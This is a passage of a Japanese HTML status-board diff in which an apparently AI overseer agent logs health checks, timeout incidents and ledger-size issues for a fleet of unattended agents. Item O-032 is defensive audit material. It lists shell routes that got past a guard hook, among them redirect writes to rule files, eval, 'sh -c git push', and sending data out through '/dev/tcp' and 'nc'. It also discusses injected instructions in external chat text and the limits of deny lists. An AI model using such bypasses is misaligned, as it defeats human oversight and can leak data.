で消える）は<strong>許可先に入っていません</strong>＝衝突リスクは物理的に解消。生データ CSV・README・<span class="font-mono">journal-rules.json</span> も同様に許可先の外＝改変不能。③統括が O-025 で「comms と同じ書き方をすると効いたつもりの空振りになる」と指摘した<strong>委任経路の限界</strong>（サブエージェントは同一セッション＝<span class="font-mono">MYAGENT_AGENT</span> は親のまま）は、ガードの docstring（L39-43）と <span class="font-mono">rules/modes/finance.md</span> v0.2 L47 の<strong>双方に明記</strong>＝誤解が残らない形になっています。④comms 専用のハードコードだった追加制限が<strong>表へ一般化</strong>＝新モードは1行追加で済む（O-025 で挙げた「モード新設時に手順が抜ける」構造穴への対処）。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>⚠️ 未確認（正直に記録します）</strong>：回帰テスト <span class="font-mono">bin/test-guard-unattended-edits.py</span>（07-29 13:41・6.7KB）は<strong>ファイルの実在だけ</strong>確認しました。<strong>本サイクルでは実行していません</strong>＝統括の許可コマンドに <span class="font-mono">python3 bin/test-*.py</span> が無く、実行が承認待ちで止まるためです。したがって<strong>「44件全件合格」は commit <span class="font-mono">621b434</span> の記録であって、統括の実測ではありません</strong>。<strong>お願い（1行・社長の一言で終わります）</strong>＝<span class="font-mono">.claude/settings.local.json</span> の allow に <span class="font-mono">Bash(python3 bin/test-*.py:*)</span> を追加していただければ、以後の精密診断で安全機構の回帰テストを毎回実測して報告できます（テストは読み取り専用＝ガードにダミー入力を流して判定結果を見るだけ）。</p>
+      <p class="text-xs text-gray-700"><strong>ステータス</strong>：✅ 解決（次サイクルでアーカイブへ収容）。<strong>残り3件（②F-NNN 採番の flock 排他なし／③partner 側に F 台帳の再読ウォーターマークなし／④棚卸し表の Tailwind CDN 依存）は 🟢低・「次に finance／partner へ手を入れる改修に同乗」で追跡継続</strong>（単独着手しません）。</p>
+    </div>
+
+    <div class="border border-amber-300 rounded-lg p-4 mb-4 bg-amber-50/40">
+      <h4 class="font-bold mb-2 text-sm">🟡 O-032 — 無人モードの Bash 制限を OS 側で封じ込める（新規起票・依頼元＝hanasaka-main）</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（依頼元の実測＋統括の裏取り）</strong>：commit <span class="font-mono">621b434</span> 以前、ガードの Bash 判定は「拒否リストに当たらなければ即許可」だったため、<strong>モード別の書き込みホワイトリストも外部送信禁止も Bash 経由で丸ごと迂回できました</strong>。Codex が実際に通した経路は11件（<span class="font-mono">printf x &gt; SYSTEM.md</span>／<span class="font-mono">sed -i CLAUDE.md</span>／<span class="font-mono">tee</span>／<span class="font-mono">python3 -c "open('SYSTEM.md','w')"</span>／<span class="font-mono">sh -c 'git push'</span>／<span class="font-mono">/usr/bin/git push</span>／大文字 <span class="font-mono">GIT push</span>／<span class="font-mono">eval "$CMD"</span>／<span class="font-mono">exec 3&lt;&gt;/dev/tcp/...</span>／<span class="font-mono">nc host 80 &lt; 台帳</span>）。<strong>統括の裏取り</strong>＝これは今回持ち込まれた穴ではなく、<strong>07-27 から2時間おきに無人稼働している comms にも開いていた既存の穴</strong>です（<span class="font-mono">data/comms/chatwork/ledger.md</span> が本日 12:12 更新＝現に外部の人が書いた Chatwork 本文を無人で読み続けていることを実測）。暫定対処は同日 commit 済みで、<span class="font-mono">bin/guard-unattended-edits.py</span> L86-88 に「ファイルへの <span class="font-mono">&gt;</span> リダイレクトは一律拒否して Write ツールへ誘導」が実装されていることを統括が実読で確認しました。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>なぜ問題か（＝残る課題の正体）</strong>：塞いだのは<strong>既知のパターン</strong>であり、Bash 側は本質的に拒否リストです。シェルは書き換えが無限にできるため（未知のコマンド名・難読化）、<strong>拒否リストで塞ぎ切ることは原理的にできません</strong>。ここで得られているのは「AI がうっかり、あるいは外部入力の指示につられて<span class="underline">素直に</span>実行する」経路の遮断であって、<strong>敵対的な回避への保証ではありません</strong>（この限界はガードの docstring にも明記済み＝誇張表現は削除されています）。強い保証が要るなら OS 側で囲う必要があります。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>推奨（誰が・何を）</strong>：<strong>社長のご判断は「着手時期」だけ</strong>です（方式の設計は有人＋Codex の領分＝統括は設計しません）。選択肢＝<strong>案A</strong> 無人ループを専用ユーザで実行しリポジトリを読み取り専用・許可先だけ書き込み可にする／<strong>案B</strong> <span class="font-mono">bubblewrap</span>・systemd sandbox（<span class="font-mono">ReadOnlyPaths</span>・<span class="font-mono">ReadWritePaths</span>・<span class="font-mono">PrivateNetwork</span>）／<strong>案C</strong> 外部入力を読むモード（comms・将来の finance）だけネットワーク遮断し、取得スクリプトは別プロセス化。<strong>統括の見立て＝今すぐの着手は要りません</strong>：①暫定対処で「素直な実行」経路は塞がれた ②狙われている証拠はない ③AI は敵対者ではない。一方で<strong>comms の無人稼働は今後も続く</strong>ため、<strong>次に VPS の実行環境（cron・systemd）へ手を入れる機会に同乗させるのが最小コスト</strong>です。着手するなら<strong>案C を推します</strong>＝範囲が最も狭く（comms は取得 <span class="font-mono">chatwork-fetch.py</span> と蒸留が既に別プロセス＝切り離しやすい）、効果が明確（外部送信の穴は「ネットワークが無い」で構造的に閉じる＝拒否リストの限界を受けない）。</p>
+      <p class="text-xs text-gray-700"><strong>効果</strong>：中（安全の穴・<span class="font-mono">rules/automation.md</span> §3 系）／<strong>工数</strong>：中〜大（OS 設定＝cron・systemd の変更を伴う）／<strong>優先度</strong>：🟡／<strong>関連</strong>：✅O-025・<span class="font-mono">rules/modes/finance.md</span> v0.2・commit <span class="font-mono">621b434</span>・O-024（同乗方式の追跡）／<strong>ステータス</strong>：⏳ Pending（判断＝着手時期のみ）。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">🩺 基盤の健康チェック（軽い巡回の範囲・すべて実測）</h4>
+      <ul class="text-xs text-gray-700 space-y-1 list-disc pl-5">
+        <li><strong>生存確認</strong>：<span class="font-mono">last-tick.txt</span> 13:45:11 JST・<span class="font-mono">status=ok</span>・全14エージェント <span class="font-mono">0:idle</span>（chat／memo-triage／overseer／partner／hp-loop 6サイト／blog 3種／comms）。</li>
+        <li><strong>故障</strong>：<span class="font-mono">failures.jsonl</span> の 07-29 分は<strong>1件のみ</strong>（05:25 <span class="font-mono">blog-loop:ycom-timeout</span>＝既報 O-029 の4件目・追加発生なし）。</li>
+        <li><strong>mailbox</strong>：<span class="font-mono">hold/</span> <strong>0通</strong>。<span class="font-mono">new/</span> は本便の処理後<strong>10通</strong>（内訳は既報 O-027＝拠点PC常駐の web-hanasaka／fujisaka-dev／yoshida-dev 宛が主・VPS からは起動できない構造。新規滞留なし）。</li>
+        <li><strong>Slack 復路</strong>：<span class="font-mono">fetch</span> 正常完走（新着なし・輪番走査で古いスレッド89件スキップ・呼び出し上限超過0件・ratelimited なし）。</li>
+        <li><strong>既報の再督促なし</strong>：O-029／O-026／O-027／O-028／O-030／O-031／O-020／O-021／O-016／O-017／O-014／O-009／O-024／O-004／O-006 は本サイクルでは実測せず（軽い巡回の既定どおり・数値は次の精密診断 08-03 で更新）。</li>
+        <li><strong>掲示板の器の規律（自分の分）</strong>：本サイクルの追記で index が <strong>97.7KB＝自分の 80KB トリップワイヤを超過</strong>したため、2手で戻しました＝①<strong>ページ冒頭の「最終更新」欄が Cycle 050〜055 の要約を溜め込み 8.4KB＝index 全体の11%</strong>になっていたので当サイクル分に圧縮（各サイクルの全文はサイクルログ／アーカイブに残存＝要約の重複だけを落とした）②<strong>Cycle 054 を <a href="archive.html" class="text-blue-600 hover:underline">アーカイブ</a>へ収容</strong>（Edit ツールでの完全一致の移送＝本文改変なし・移設先での実在を <span class="font-mono">grep</span> で確認）。結果＝index <strong>76.5KB</strong>（閾値内）・archive 196.2KB。index は「最新（056）＋直近文脈（055）＋未完了の繰り越し」に復帰。<strong>気づき</strong>：この欄は Cycle 054 で 70.3KB に戻した直後から<strong>3サイクルで 97.7KB まで戻っています</strong>＝毎サイクルの追記量そのものが器のサイズに対して大きい（次の精密診断で「1サイクルあたりの追記バイト数」を測る）。</li>
+        <li><strong>自己改善（K-384）</strong>：「安全機構の検証を、その安全機構に手を入れた本人の報告に依存していないか」＝<span class="font-mono">data/hp-improve/skill-kaizen.md</span> に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 055 ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 055 — 2026-07-29 昼（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>O-018／O-019／O-023 を✅解決としてクローズ＋残った宿題2件を O-030／O-031 に起票</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28 未明＝<strong>1日前</strong>のため切替なし。次の精密診断は 08-03 月曜 1:00 cron）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド86件スキップ）／自分宛 mailbox（<span class="font-mono">to: overseer</span> 1通＝hanasaka-main の解決申し送り）／<strong>申し送り内容の裏取り</strong>＝<span class="font-mono">rules/modes/overseer.md</span> v0.9・<span class="font-mono">partner.md</span> v0.7 L178・<span class="font-mono">hp-improve.md</span> v0.3・<span class="font-mono">comms.md</span> v0.4・新設 <span class="font-mono">rules/ledger-discipline.md</span> の実読／<span class="font-mono">skill-kaizen.md</span>＋archive のサイズと K-ID 件数／<span class="font-mono">bin/system-health.py</span> の <span class="font-mono">STATE_FILES</span> 実読／各台帳・掲示板のサイズ実測／<span class="font-mono">failures.jsonl</span> 末尾／<span class="font-mono">last-tick.txt</span>・mailbox <span class="font-mono">hold/</span>。フル診断は行わない（既定どおり）。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>解決3件・新規は低優先の追跡2件のみ・基盤は正常</strong>（<span class="font-mono">status=ok</span>／全14エージェント idle／<span class="font-mono">hold/</span> 0通／<strong>Cycle 054 以降の新規故障ゼロ</strong>＝O-029 のタイムアウトも本日以降の追加なし）。(1) <strong>✅O-018／O-019／O-023 をクローズ</strong>＝社長承認・commit <span class="font-mono">2938c88</span> で反映済みを<strong>すべて実体で検証</strong>しました。(2) <strong>統括として重い学びが1つ</strong>：O-019 の真因は「量」ではなく<strong>追記の型の破れ</strong>（単一エントリが97件を飲み込み169KB＝全体の54%）で、統括は7サイクル連続で KB を報告しながら<strong>その内訳を一度も見ていませんでした</strong>。(3) <strong>🆕O-030／O-031</strong>＝申し送りの follow-up 2件を追跡登録（どちらも🟢・判断不要・次の改修に同乗）。(4) <strong>O-021 は数値が自然解消</strong>＝ycom coverage 113.4→<strong>99.0KB</strong>（hp-loop 側が無人で機械ローテの手順を確立＝K-371）。ご判断（恒久ルール化の要否）は不変。</p>
+    </div>
+
+    <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+      <h4 class="font-bold mb-2 text-sm">✅ O-018／O-019／O-023 — 検証してクローズ（アーカイブへ収容）</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>経緯</strong>：hanasaka-main から mailbox 便（<span class="font-mono">M-20260729T113219</span>・fyi・Slack スレッドなし）で「社長承認・commit <span class="font-mono">2938c88</span> で3件とも反映済み。次サイクルで✅解決としてアーカイブへ」と申し送り。<strong>統括は申し送りを鵜呑みにせず、3件とも実体で確認しました</strong>（Cycle 053 の自己改善の適用＝結論でなく根拠のファイルを自分で開く）。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>検証結果（すべて実測）</strong>：①<strong>O-023</strong>＝<span class="font-mono">rules/modes/overseer.md</span> は v0.9・運用モード表と changelog の双方に<strong>「今週（月曜起算）に精密診断があるか＝対象週をウォーターマーク」</strong>が実在。「固定日数窓・前日ピンポイントは使わない」という<strong>禁止形まで明記</strong>＝再発防止として十分。②<strong>O-018</strong>＝<span class="font-mono">partner.md</span> v0.7 L178 に掲示板 <strong>80KB トリップワイヤ（スキップ不可）</strong>が実在。③<strong>O-019</strong>＝<span class="font-mono">skill-kaizen.md</span> <strong>57,688B</strong>（archive 753,973B）・本体の <span class="font-mono">K-330</span> 出現は1件のみ（暴走エントリ解消）・冒頭に「⚠️ 追記の型」と「100KB トリップワイヤ」の両方が実在・K-ID ユニーク数 本体50／archive 454。④共通ベース <span class="font-mono">rules/ledger-discipline.md</span> v0.1 が新設され、<span class="font-mono">partner.md</span>／<span class="font-mono">hp-loop.md</span>／<span class="font-mono">comms.md</span>／<span class="font-mono">hp-improve.md</span> の4本から参照されていることを grep で確認。</p>
+      <p class="text-xs text-gray-700"><strong>⚠️ 1点だけ「解決」と言い切らずに残します</strong>：<strong>O-018 の効果確認は次サイクルへ持ち越し</strong>です。現在の partner 掲示板 <span class="font-mono">site/business/partner/index.html</span> は <strong>95,311B＝93.1KB で新トリップワイヤ超過中</strong>ですが、その最終更新（10:29）は<strong>ルール成立（11:29）より前</strong>＝まだルールが適用される機会が来ていないだけです。<strong>次の partner サイクルで 80KB 以下へ自動退避されれば真の解決</strong>、されなければ O-018 を再起票します（＝「明文化した＝守られる」を自動で信じない）。台帳側 <span class="font-mono">data/partner/ledger.md</span> は 69,983B＝<strong>70KB 閾値内で正常</strong>。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟢 O-030（新規・判断不要）：comms の台帳サイズだけが機械監視の対象外＝<strong>共通ベース自身が「未計測」と書いたまま</strong></h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（実測）</strong>：<span class="font-mono">bin/system-health.py</span> の <span class="font-mono">STATE_FILES</span>（L40〜）＋<span class="font-mono">hp_loop_states()</span> が見ているのは <span class="font-mono">data/partner/ledger.md</span>・<span class="font-mono">milestones.md</span>・<span class="font-mono">skill-kaizen.md</span>・各 <span class="font-mono">coverage.md</span>・各掲示板 index。<strong><span class="font-mono">data/comms/chatwork/ledger.md</span> は含まれていません</strong>（comms について見ているのは <span class="font-mono">comms_health()</span> の poll 停滞・state 破損・蒸留の遅れ＝<strong>サイズは未計測</strong>）。一方 <span class="font-mono">rules/modes/comms.md</span> v0.4 は<strong>台帳70KB のトリップワイヤを負っています</strong>＝<strong>規律はあるが機械の目が無い</strong>状態。新設の <span class="font-mono">rules/ledger-discipline.md</span> §2 も自ら「⚠️ comms のサイズは未計測＝追加候補」「対象を増やすときは本表と <span class="font-mono">system-health.py</span> を対で更新する」と明記済み。</p>
+      <p class="text-xs text-gray-700"><strong>なぜ問題か</strong>：他の全台帳が「気づいたら退避」から「数値で機械判定」へ移行した中で、comms だけが<strong>元の自発性依存に取り残されます</strong>（O-018／O-019 で繰り返し確認したとおり、自発性は常には回らない）。<strong>実害は現時点でゼロ</strong>＝実測 <span class="font-mono">ledger.md</span> 7,635B・<span class="font-mono">archive.md</span> 1,177B＝閾値の約1割（07-27 新設のため当然）。<strong>だからこそ今は安い</strong>＝溢れてから足すのでは O-019 の再演になります。<strong>推奨（誰が・何を）</strong>＝次に <span class="font-mono">system-health.py</span> へ手を入れる有人改修で <span class="font-mono">STATE_FILES</span> に1行追加（<span class="font-mono">site/comms/index.html</span> の掲示板80KB も同時に）＋ベース §2 の表と⚠️注記を対で更新。<strong>単独着手はしません</strong>。<strong>効果</strong>：小（見えない台帳を作らない）／<strong>工数</strong>：小（1〜2行）／<strong>優先度</strong>：🟢／<strong>関連</strong>：<span class="font-mono">M-20260729T113219</span>(a)・O-019・O-031／<strong>ステータス</strong>：📋 追跡中。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟢 O-031（新規・判断不要）：器の規律の共通ベース化は<strong>「参照の追加」まで</strong>＝全文の重複が partner／hp-loop に残存</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（実読）</strong>：<span class="font-mono">rules/ledger-discipline.md</span> v0.1 が「各モードルールはこの1枚を正とし、自分は<strong>固有分だけ</strong>を持つ（＝閾値や手順を各ファイルに書き写さない）」と宣言。実際には <span class="font-mono">partner.md</span> L96 と <span class="font-mono">hp-loop.md</span> L138 に、ベース §3〜§4 と<strong>同内容の原則が全文のまま残って</strong>います（移設順序「①archive へ追記→②存在を確認→③本体から削除」・「消さない＝移すだけ」・「未完了は何があっても本体に残す」）。両行の冒頭に「原則はベースを正とする」参照が付いた形＝<strong>参照と重複の併存</strong>。<span class="font-mono">comms.md</span> L63・<span class="font-mono">hp-improve.md</span> L111 は既に1行に収まっており、残るのは長文2箇所です。</p>
+      <p class="text-xs text-gray-700"><strong>なぜ問題か</strong>：<strong>今は文面が一致しているので実害はありませんが、次にベース側だけを更新した瞬間に食い違います</strong>＝共通ベースがまさに解こうとした版ズレが、同じ形で再発する構造。統括の健康シグナル「共通部の流用整合（再記述でなく参照で繋がっているか）」に照らすと、現状は<strong>「参照はある／再記述も残っている」＝半分だけ</strong>。<strong>推奨（誰が・何を）</strong>＝次に <span class="font-mono">partner.md</span>／<span class="font-mono">hp-loop.md</span> へ手を入れる有人改修で、当該ブロックを<strong>「ベース参照＋固有の上書き（partner＝台帳70KB・掲示板80KB／hp-loop＝台帳100KB・掲示板80KB）1〜2行」に圧縮</strong>。<strong>単独着手はしません</strong>（ルール編集は社長合意＋無人はフックで不可）。<strong>効果</strong>：小〜中（版ズレの根を断つ）／<strong>工数</strong>：小／<strong>優先度</strong>：🟢／<strong>関連</strong>：<span class="font-mono">M-20260729T113219</span>(b)・O-018・O-021・O-030／<strong>ステータス</strong>：📋 追跡中。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（軽い巡回）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>受信箱処理</strong>：<span class="font-mono">M-20260729T113219-hanasaka-main</span>（fyi・O-018/019/023 解決の申し送り＋follow-up 2件の起票依頼）→ 検証のうえ3件クローズ・2件起票し <span class="font-mono">slack-poll.py done</span> で <span class="font-mono">cur/</span> へ移動。<span class="font-mono">thread</span> 空＝エージェント間 mailbox 便のため<strong>スレッド返信は対象外</strong>（社長への報告は日報スレッドへ投稿）。</li>
+        <li><strong>基盤の生存確認</strong>：<span class="font-mono">last-tick.txt</span> 11:32:11 <span class="font-mono">status=ok</span>・全14エージェント <span class="font-mono">0:idle</span>／mailbox <span class="font-mono">hold/</span> 0通・<span class="font-mono">new/</span> 11通（うち10通は O-027 の既報＝拠点PC未起動による滞留・<strong>新規の生インスタンスなし</strong>）／<span class="font-mono">failures.jsonl</span> 末尾＝<strong>Cycle 054 の報告以降の追加ゼロ</strong>（最新は 07-29 05:25 の blog-loop:ycom-timeout＝既報 O-029）。<strong>Cycle 054 の自己改善（増えた行だけは必ず見る）を初適用</strong>。</li>
+        <li><strong>既報の再督促なし</strong>：O-020／O-025／O-026／O-027／O-028／O-029 は本サイクルでは実測せず（軽い巡回の既定）。O-021 のみ、解決3件の検証で台帳サイズを横断実測したため<strong>ついでに得られた実数（99.0KB へ復帰）を反映</strong>＝追加コストなし。</li>
+        <li><strong>掲示板の器の規律（自分の分）</strong>：本サイクル追記後の <span class="font-mono">index.html</span> は 80KB tripwire 内（解決3件を<strong>アーカイブの「解決・決着した提案」へ収容</strong>し、繰り越し表からも除いたため差し引きで抑制）。追記後に実測したところ <strong>89.1KB＝自分の 80KB tripwire を超過</strong>していたため、<strong>Cycle 053 をアーカイブへ収容</strong>し <strong>72.9KB</strong>へ復帰（archive 166.4→182.9KB）。<strong>バイト検算済み</strong>＝index 91,272−16,592＝74,680・archive 166,354＋16,592＝182,946＝<strong>移送分が過不足なく一致・本文改変ゼロ</strong>（<span class="font-mono">head</span>/<span class="font-mono">tail</span>/<span class="font-mono">cat</span> による機械移送＝K-371 と同型の「承認範囲内のコマンドで完結させる」適用）。<strong>他モードに 80KB／100KB を求めている統括自身が超過を持ち越さない</strong>ため当日実施。</li>
+        <li>Slack 投稿：<strong>投稿する</strong>（解決3件のご報告＋新規追跡2件のお知らせ。<strong>新しいご判断のお願いは無し</strong>＝O-018 の効果確認が次サイクルに残る点だけ一手前でお伝えする）。</li>
+        <li><strong>自己改善</strong>：気づき＝<strong>「サイズ警報は"量"を教えるが"構造"は教えない。閾値超過を起票するとき、一度も"何が太らせているか"の内訳を見ていなかった」</strong>。O-019 で 7サイクル連続 KB を報告し続けたが、真因は<strong>単一エントリが全体の54%を占める分布の異常</strong>で、有人セッションが1回開いて即座に見抜いた。＝<strong>今後、台帳の閾値超過を起票するときは「最大エントリの占有率」を1回だけ添える</strong>（<span class="font-mono">grep -c '^### '</span> と最大ブロックのバイト数＝数十秒）。あわせて O-023 から<strong>「自分の判定ロジックの修正案は、その処理自身が実行された後の状態で再評価する」</strong>（統括案の穴を Codex が拾った）。<strong>2件とも <span class="font-mono">data/hp-improve/skill-kaizen.md</span> に <span class="font-mono">K-382</span>／<span class="font-mono">K-383</span> として記録しました</strong>（新しい「⚠️ 追記の型」＝<span class="font-mono">### K-NNN</span> の独立見出し・採番前に本ファイルを grep、に従って追記。追記後 60.0KB＝100KB tripwire 内・独立見出し33件）。<strong>台帳が健全化された初日に、統括自身が新しい型どおりに書けることを実地で確認した</strong>形です（O-019 の再発防止が書き手側で効いているかの検証を兼ねる）。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 054 ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 054 — 2026-07-29（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>hanasaka-main の依頼で O-022 を✅クローズ＋新規の綻び1件を起票（ycom 系日次便の25分タイムアウトが5日で4回）</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28 未明＝<strong>1日前</strong>のため切替なし。次の精密診断は 08-03 月曜 1:00 cron）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド84件スキップ・ratelimited なし）／自分宛 mailbox <span class="font-mono">new/</span>（<span class="font-mono">to: overseer</span> 1通）／<span class="font-mono">data/overseer/failures.jsonl</span>（全18行）／<span class="font-mono">tick.log</span> 当日分／<span class="font-mono">site/hp-analysis/ycom/index.html</span>・同 <span class="font-mono">blog/index.html</span> の更新時刻と最新 Cycle／<span class="font-mono">site/overseer/{index,archive}.html</span> の既報照合／<span class="font-mono">last-tick.txt</span>（10:31:50 status=ok）。</p>
+
+    <div class="border-l-4 border-amber-400 bg-amber-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>新規提案1件（🟡O-029）＋クローズ1件（✅O-022）。基盤は正常</strong>（ディスパッチャ生存・Slack 復路良好・mailbox <span class="font-mono">hold/</span> 0通）。(1) <strong>🆕O-029</strong>：ycom 系の日次便が <strong>25分で強制終了する事象が5日で4回</strong>。打ち切りは<strong>サイクル末尾</strong>で起きており、掲示板は書けているのにその後ろの工程が黙って落ちうる＝<strong>「更新されている＝正常」と誤読させる部分失敗</strong>。<strong>統括レポートにこれまで1度も記録がありませんでした</strong>（自分の見落とし＝下記の自己改善）。(2) <strong>✅O-022 クローズ</strong>：07-27 の無人便全滅の原因が<strong>課金決済の不通</strong>と確定（社長ご確認済み）＝システム側の恒久対処は不要。週次 blog 便は 08-03 の定期便を待つ判断で手動リカバリなし。アーカイブへ収容しました。</p>
+    </div>
+
+    <!-- O-029 -->
+    <div class="border border-amber-200 rounded-lg p-4 mb-4">
+      <div class="flex items-center justify-between mb-1">
+        <h4 class="font-bold">🟡 O-029（新規）：ycom 系の日次便が25分でタイムアウト強制終了＝5日で4回・打ち切りは<strong>サイクル末尾</strong></h4>
+        <span class="text-xs font-bold text-white bg-amber-500 px-2 py-0.5 rounded">⏳ Pending</span>
+      </div>
+      <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+        <li><strong>観察（実測）</strong>：<span class="font-mono">data/overseer/failures.jsonl</span>（切り詰めなし・60日ローテ）に <span class="font-mono">-timeout</span> が4件＝<strong>07-25 02:25 hp-loop:ycom／07-26 05:25 blog-loop:ycom／07-28 02:25 hp-loop:ycom／07-29 05:25 blog-loop:ycom</strong>。同ファイルの残り13件は 07-26〜07-27 の <span class="font-mono">-fail(1)</span>＝O-022（課金起因の全滅）で別系統。<strong>タイムアウトは4件とも ycom</strong>＝他5サイト・partner・memo・comms はゼロ。</li>
+        <li><strong>観察（本日の便の中身）</strong>：<span class="font-mono">tick.log</span> より 05:00:18 に <span class="font-mono">claude -p /blog-loop ycom</span> 起動（timeout=1500s）→ <span class="font-mono">site/hp-analysis/ycom/blog/index.html</span> の mtime は <strong>05:24</strong>（最新 <strong>Cycle 049 — 2026-07-29</strong> が書けている）→ 標準出力に <span class="font-mono">Execution error</span> → <strong>05:25:19 に制限時間満了で強制終了</strong>（<span class="font-mono">[ALERT] ヘッドレス blog-loop:ycom が25分でタイムアウトしました</span>）。<strong>＝25分をフルに使い、成果物を書いた直後に落ちている</strong>。</li>
+        <li><strong>観察（既報との照合）</strong>：<span class="font-mono">site/overseer/index.html</span>・<span class="font-mono">archive.html</span> を「タイムアウト」で grep＝<strong>いずれも0件</strong>。本事象は<strong>統括レポートに一度も記録がない</strong>（＝新規の綻び。O-022 の全滅とは原因も時期も別）。なお本日 02:00 の hp-loop:ycom 便は正常完走（掲示板 02:21・Cycle 076）＝<strong>毎回落ちるわけではない</strong>。</li>
+        <li><strong>なぜ問題か</strong>：打ち切りが<strong>サイクルの末尾</strong>で起きるため、成果物（掲示板）は残る一方で、その後ろの工程＝<strong>Slack日報・mailbox 配信（実装担当への引き渡し）・台帳/掲示板のローテ・自己チェック</strong>が完了したか未確認のまま落ちうる。社長からは「掲示板が更新されている＝正常」に見えるので、<strong>無言の部分失敗</strong>になる。頻度は週2回ペース＝放置すると常態化する。</li>
+        <li><strong>推測</strong>：ycom だけに集中するのは、ycom が<strong>最大の状態量</strong>を抱えていることと整合（coverage <strong>113.4KB</strong>＝O-021 の tripwire 超過が継続・掲示板 81.8KB・ブログ掲示板 92.0KB）。＝<strong>O-021 の未着手が、別の症状として出始めた可能性</strong>。<strong>断定はしません</strong>＝工程別の所要時間を実測していないため（統括は無人では計測しない＝測るのは「打ち切られた事実」であって使用量ではない＝測定の原則）。</li>
+        <li><strong>推奨（誰が・何を）＝社長のご判断・3案（併用可／実施は有人セッション）</strong>：<strong>①事実確認から（推奨・低コスト）</strong>＝次の有人セッションで ycom 便を1回だけ走らせ「どの工程が25分を食っているか」を実測する。②③の選択はその結果で決める／<strong>②対症</strong>＝<span class="font-mono">bin/agent-tick.sh</span> の制限時間を <strong>ycom 便だけ 1500秒→2400秒</strong>へ（crontab 変更なし・1行・社長作業なし）。根因が状態量なら先送りになる点は自覚したうえで／<strong>③根因</strong>＝<strong>O-021（coverage 台帳ローテの恒久ルール化）に着手</strong>する。</li>
+        <li><strong>効果</strong>：中（無言の部分失敗を止め、日次便の完走を担保）／<strong>工数</strong>：小（①は数分・②は1行）／<strong>優先度</strong>：🟡（🔴でない理由＝成果物である掲示板は現状書けており、案件が止まってはいないため）</li>
+        <li><strong>関連</strong>：O-021（ycom coverage 113.4KB）・O-022（07-27 の全滅＝課金起因・別物）・<span class="font-mono">data/overseer/failures.jsonl</span>・<span class="font-mono">bin/agent-tick.sh</span> L185-189（<span class="font-mono">timeout --kill-after=30s</span>／<span class="font-mono">fail "$label-timeout"</span>）</li>
+      </ul>
+    </div>
+
+    <!-- O-022 クローズ -->
+    <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+      <div class="flex items-center justify-between mb-1">
+        <h4 class="font-bold">✅ O-022：07-27 の無人便全滅＝<strong>原因は課金決済の不通</strong>と確定・クローズ</h4>
+        <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 解決（2026-07-29・社長ご確認済み）</span>
+      </div>
+      <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+        <li><strong>決着</strong>：hanasaka-main から mailbox 便（<span class="font-mono">M-20260729T102219</span>）でクローズ依頼。原因＝<strong>Anthropic の課金（クレジットカード決済）が通らず、サブスクアクセスが一時的に無効化された</strong>もの。VPS 設定変更なし・外部起因・07-27 昼に決済回復で自然復旧。<strong>決済は社長側で管理される方針＝システム側の恒久対処は不要</strong>。</li>
+        <li><strong>申し送り</strong>：欠落した週次 blog 便（今週分）は<strong>次回 08-03 の定期便を待つ判断＝手動リカバリはしない</strong>（社長ご判断）。</li>
+        <li><strong>統括として残す観測</strong>：認証・課金レイヤ起因の全便停止は<strong>これで2回目</strong>（1回目＝07-23 の認証セッション切れ）。<strong>3回目が起きたら「単一障害点の対策（API キー fallback 等）」を設計課題として起票</strong>する方針は維持します（partner K-348 と同基準・それまでは監視のみ）。＝<strong>今回のクローズは「原因の追跡」を閉じるもので、この回数カウントは継続</strong>します。</li>
+        <li><strong>関連</strong>：O-027（web-hanasaka 5日・fujisaka-dev 35日の未受領は<strong>本件とは別原因＝拠点PC未起動</strong>・切り分け済み）・<a href="archive.html" class="text-blue-600 hover:underline">アーカイブへ収容済み</a></li>
+      </ul>
+    </div>
+
+    <div class="text-sm text-gray-600 space-y-1">
+      <p><strong>本サイクルの作業ログ</strong></p>
+      <ul class="list-disc list-inside space-y-1">
+        <li>Slack <span class="font-mono">fetch</span>：新着なし（輪番走査で古いスレッド84件スキップ・呼び出し上限超過0件）＝復路は正常。</li>
